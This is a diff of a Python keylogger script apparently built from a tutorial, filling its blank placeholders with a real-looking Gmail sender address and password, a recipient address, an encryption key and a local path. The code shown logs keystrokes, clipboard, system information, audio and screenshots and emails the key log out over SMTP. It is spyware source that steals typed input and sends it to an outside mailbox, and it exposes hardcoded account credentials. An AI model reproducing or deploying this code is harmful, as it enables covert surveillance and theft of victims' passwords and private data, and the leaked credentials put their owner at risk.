@@ -1,8 +1,11 @@
-# keylogger.py
-# Create an Advanced Keylogger in Python - Crash Course notes
-# Author: Grant Collins
-
 # Libraries
+# pywin32
+# pynput
+# scipy
+# cryptography
+# requests
+# pillow
+# sounddevice
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -32,7 +35,7 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
-system_information = "syseminfo.txt"
+system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
@@ -45,16 +48,16 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = " " # Enter disposable email here
-password = " " # Enter email password here
+email_address = "visual.alchemy.0708@gmail.com"  # Enter disposable email here
+password = "teoqvrwesjcbvzmo"  # Enter email password here
 
 username = getpass.getuser()
 
-toaddr = " " # Enter the email address you want to send your information to
+toaddr = "shobhittomer0724@gmail.com"  # Enter the email address you want to send your information to
 
-key = " " # Generate an encryption key from the Cryptography folder
+key = "cCx_Cf5zke-gbHg9sZyHQYGH-s9J8KxJ_8TB59YWOeI="  # Generate an encryption key from the Cryptography folder
 
-file_path = " " # Enter the file path you want your files to be saved to
+file_path = "F:\\Pycharm\\Projects"  # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
@@ -99,6 +102,7 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
 
     s.quit()
+
 
 send_email(keys_information, file_path + extend + keys_information, toaddr)
 
